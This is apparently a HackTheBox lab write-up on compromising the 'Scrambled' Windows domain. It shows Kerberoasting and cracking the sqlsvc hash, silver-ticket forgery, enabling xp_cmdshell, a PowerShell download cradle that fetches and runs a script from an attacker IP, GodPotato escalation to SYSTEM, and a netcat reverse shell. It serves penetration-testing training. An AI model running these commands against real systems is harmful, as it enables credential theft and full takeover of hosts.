---
categories:
    - htb
layout: post
title: Scrambled Writeup - HackTheBox
tags:
    - writeup
    - hackthebox
    - medium
    - AD
---



Scrambled is a medium Windows Active Directory machine

## Enumeration

There is a website available on port 80 - the below message is in the IT support tab along with some services to contact IT support of User Creation, Password Rest

```
04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues 
```

There is a contact form but does not lead anywhere

At this url - `http://10.129.120.144/supportrequest.html` There is an image with a user `ksimpson` , lets try to use the username as password and request TGT

## User

```
impacket-getTGT scrm.local/ksimpson                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
Password:
[*] Saving ticket in ksimpson.ccache
```

The password works, lets also setup krb5.conf 
```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SCRM.LOCAL

[realms]
    SCRM.LOCAL = {
        kdc = dc1.scrm.local
        admin_server = dc1.scrm.local
        default_domain = scrm.local
    }

[domain_realm]
    .scrm.local = SCRM.LOCAL
    scrm.htb = SCRM.LOCAL
```

now we can use nxc, lets list shares

```
nxc smb dc1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --shares
SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson
SMB         dc1.scrm.local  445    dc1              [*] Enumerated shares
SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark
SMB         dc1.scrm.local  445    dc1              -----           -----------     ------
SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin
SMB         dc1.scrm.local  445    dc1              C$                              Default share
SMB         dc1.scrm.local  445    dc1              HR
SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC
SMB         dc1.scrm.local  445    dc1              IT
SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share
SMB         dc1.scrm.local  445    dc1              Public          READ
SMB         dc1.scrm.local  445    dc1              Sales
SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share
```

There is PDF we can download 

```
impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use Public
l# ls
drw-rw-rw-          0  Thu Nov  4 23:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 23:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 18:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```

The pdf just confirms the NTLM disabling and mentions about SQL credentials, so lets try kerberoasting to get the sql account

```
nxc ldap dc1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --kerberoast hash
LDAP        dc1.scrm.local  389    DC1              [*] None (name:DC1) (domain:scrm.local)
LDAPS       dc1.scrm.local  636    DC1              [+] scrm.local\ksimpson
LDAPS       dc1.scrm.local  636    DC1              [*] Skipping disabled account: krbtgt
LDAPS       dc1.scrm.local  636    DC1              [*] Total of records returned 1
LDAPS       dc1.scrm.local  636    DC1              [*] sAMAccountName: sqlsvc, memberOf: [], pwdLastSet: 2021-11-03 17:32:02.351452, lastLogon: 2025-07-30 21:40:45.536597
LDAPS       dc1.scrm.local  636    DC1              $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local\sqlsvc*$7d3c9ae71ca39864fadfcabf1eac747d$7ca674517ba7c5424539d87e1c379b706d4babb953a70223dd0b8ad100e6a1d6bc1a2ba91abf241eefa813c79b7c4d6c07d5462663dbcbe9ff5c1c3b2f98891bdf68f44f80d5922fc3f3626cea3e31fecd5a1d5d642575f19901ac67e9519beb21d2428c713ab55ec3f9fd08aa268e48ed560cdbfd9752fa0cec11b352dc8d341c31168aacc034326c1b5ad4f117492c5200fac278ea2dad0164b4c23d0294f93efdc4ae55ca69531a2aff77df43ca0195e26238094e4c6ace31afdc11ef1257084ef13bb195b0b89028d28998927331d47d854bf010a4f4dc03afebd465d6340a65dc5507fc44915508fc602ece0db141b5d5f0ea561921ac3de078c55b9b198d921ba76e767329b8f42f87824af47a4ceae4bb8ddaa3bf576ab11c0d2a7822bdf18390df7b7047e138039b586dbf947c5e60074870950ab3c3975324c905d5caac981aabe9fe3ff6ed7df612f41a4de6b3d58819d4dbcfdb283dade0a8472f3b01c3af621200acdb9fab911ae3ac7e2768a7cb4630d5876cc739846397f4241ee471ff17eeaa5d0b4c8f6323f095dd0a57e4ffd7f60ccaeaa7a1aef87306a4b9efff83fd10011d122d632f99821eca7066ad5545e7ea270ea0dc3e96c179737e3368a60347fb64ad9425eff1996c80ab3a51a851449e0bb1c177aae3227e50080e3af92c3abb7f2733fe480550c2ba723ae09f84a9d2d899760a6979adf2691337a3add967802748381bf8c46d3976deaa4d8ce5afb8add632ec312c4b520d21c2c5ff3e7bffcd3da33d2f5098948caded75346a15c28406550a19b9061e4e2387970ef268089cdeff7072c8dd1e0c5e3ef83473232e94a8bb1164b18de610827477aacfc01d250121dfab68db233733888cd3b0343b021978d8caaedac0b664d6807110a4e56d0327b8662cf0d0ad423c87c95cdbf5ae49763cbe7287bf0a83f30c58adbc3d5ac8f25767c123b56ceb94fe76ce04f4a016368e947ba4880258038201a592bc27fe0d872662a64811cff944096d7cd845351f962205254d4b102bc51b066ba28aad93c3f91e03ad68a0b8a85fbd17f4a7041b5cf0e42c2542cff23ebef2ab0d0b93a6df794fdde8062b079f2cc097b07e0a92b2f69804a7b0df1056f15c7a0775052ebff5219cf22c1d7642379f5fd5f5ac2d46230d74e45190761ed5c4dac50b478171f20baa7cd01569e88b8740849cc64a97f90b7327e9b8d086a3103cc595e7bd96d600f63b6789a03a92d258347e5f8733617dd0cbc91043ab1cd7ce91edb9c1a004faf8a4b5e72a29173adce75435c99198a544b2e2f187dcce9d377442c83f48785f48876bbf96f13df150b0274497fbfff4b7a1df715edde41d6905340587665acaf25fce8c9d0a3ea5f1b98516fadeadbdabaae00b78db0c2acaf7a33f04da59ccf6c0a53f8840121b887d93ae78d3
```

Lets crack it using john

```
./john --wordlist=../../SecLists/Passwords/Leaked-Databases/rockyou.txt hash
Warning: detected hash type "krb5tgs", but the string is also recognized as "krb5tgs-opencl"
Use the "--format=krb5tgs-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Pegasus60        (?)
1g 0:00:00:09 DONE (2025-07-30 22:52) 0.1050g/s 1126Kp/s 1126Kc/s 1126KC/s Pegasus76..Peewee33
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

lets try to auth to the mssql service using the account

```
impacket-mssqlclient sqlsvc@dc1.scrm.local -k -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Password:
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: sqlsvc.ccache
[+] Domain retrieved from CCache: SCRM.LOCAL
[+] SPN MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Searching target's instances to look for port number 1433
[+] Trying to connect to KDC at SCRM.LOCAL:88
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

## Root

everything fails in this path but since we have a service account we can forge a ticket for any user for that since since its signed by the service account, this attack is called a silver ticket

We need to have a few things, First lets make the nthash for the sqlsvc user

```
iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

Lets use lookupsid to get the domain SID and info

```
impacket-lookupsid sqlsvc@dc1.scrm.local -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at dc1.scrm.local
[*] StringBinding ncacn_np:dc1.scrm.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
498: SCRM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SCRM\administrator (SidTypeUser)
501: SCRM\Guest (SidTypeUser)
502: SCRM\krbtgt (SidTypeUser)
512: SCRM\Domain Admins (SidTypeGroup)
513: SCRM\Domain Users (SidTypeGroup)
514: SCRM\Domain Guests (SidTypeGroup)
515: SCRM\Domain Computers (SidTypeGroup)
516: SCRM\Domain Controllers (SidTypeGroup)
517: SCRM\Cert Publishers (SidTypeAlias)
518: SCRM\Schema Admins (SidTypeGroup)
519: SCRM\Enterprise Admins (SidTypeGroup)
520: SCRM\Group Policy Creator Owners (SidTypeGroup)
521: SCRM\Read-only Domain Controllers (SidTypeGroup)
522: SCRM\Cloneable Domain Controllers (SidTypeGroup)
525: SCRM\Protected Users (SidTypeGroup)
526: SCRM\Key Admins (SidTypeGroup)
527: SCRM\Enterprise Key Admins (SidTypeGroup)
553: SCRM\RAS and IAS Servers (SidTypeAlias)
571: SCRM\Allowed RODC Password Replication Group (SidTypeAlias)
572: SCRM\Denied RODC Password Replication Group (SidTypeAlias)
1000: SCRM\DC1$ (SidTypeUser)
1101: SCRM\DnsAdmins (SidTypeAlias)
1102: SCRM\DnsUpdateProxy (SidTypeGroup)
1106: SCRM\tstar (SidTypeUser)
1107: SCRM\asmith (SidTypeUser)
1109: SCRM\ProductionFloor1 (SidTypeGroup)
1114: SCRM\ProductionShare (SidTypeGroup)
1115: SCRM\AllUsers (SidTypeGroup)
1118: SCRM\sjenkins (SidTypeUser)
1119: SCRM\sdonington (SidTypeUser)
1120: SCRM\WS01$ (SidTypeUser)
1601: SCRM\backupsvc (SidTypeUser)
1603: SCRM\jhall (SidTypeUser)
1604: SCRM\rsmith (SidTypeUser)
1605: SCRM\ehooker (SidTypeUser)
1606: SCRM\SalesUsers (SidTypeGroup)
1608: SCRM\HRShare (SidTypeGroup)
1609: SCRM\ITShare (SidTypeGroup)
1610: SCRM\ITUsers (SidTypeGroup)
1611: SCRM\khicks (SidTypeUser)
1612: SCRM\SalesShare (SidTypeGroup)
1613: SCRM\sqlsvc (SidTypeUser)
1616: SCRM\SQLServer2005SQLBrowserUser$DC1 (SidTypeAlias)
1617: SCRM\miscsvc (SidTypeUser)
1619: SCRM\ksimpson (SidTypeUser)
1620: SCRM\NoAccess (SidTypeGroup)
```

Lets forge the ticket

```
impacket-ticketer -nthash "b999a16500b87d17ec7f2e2a68778f05" -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -domain scrm.local -spn "MSSQLSvc/dc1.scrm.local:1433" administrator

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

We can now auth as administrator

```
impacket-mssqlclient administrator@dc1.scrm.local -k -debug -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: administrator.ccache
[+] Domain retrieved from CCache: SCRM.LOCAL
[+] Returning cached credential for MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL
[+] Using TGS from cache
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

since we are dbo, lets enable xp_cmdshell

```
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Lets setup a rev shell and execute it via powershell download cradle as there is max length

```
SQL (SCRM\administrator  dbo@master)> EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.136/shell.ps1'')"';
```

Lets catch shell and check privs
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.136] from (UNKNOWN) [10.129.120.144] 59579

PS C:\Windows\system32> whoami
scrm\sqlsvc
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Since we have `SeImpersonatePrivilege`  Lets abuse LPE Potatos to gain system. I used godpotato

```
PS C:\temp> .\gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140707864117248
[*] DispatchTable: 0x140707866423360
[*] UseProtseqFunction: 0x140707865799888
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\5204cada-0dd4-415a-832a-7cc9ce02f338\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008402-1574-ffff-c97f-21b258c0158c
[*] DCOM obj OXID: 0x44eb9f51751c0a00
[*] DCOM obj OID: 0xa3159eae391d213f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 896 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5156
nt authority\system
PS C:\temp> wget 10.10.14.136/nc.exe -o nc.exe
PS C:\temp> .\gp.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.136 4443"



nc -lvnp 4443                                                             
listening on [any] 4443 ...
connect to [10.10.14.136] from (UNKNOWN) [10.129.120.144] 59600
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\temp>whoami
whoami
nt authority\system
```

The root flag is in administrator desktop and the user flag is in miscsvc

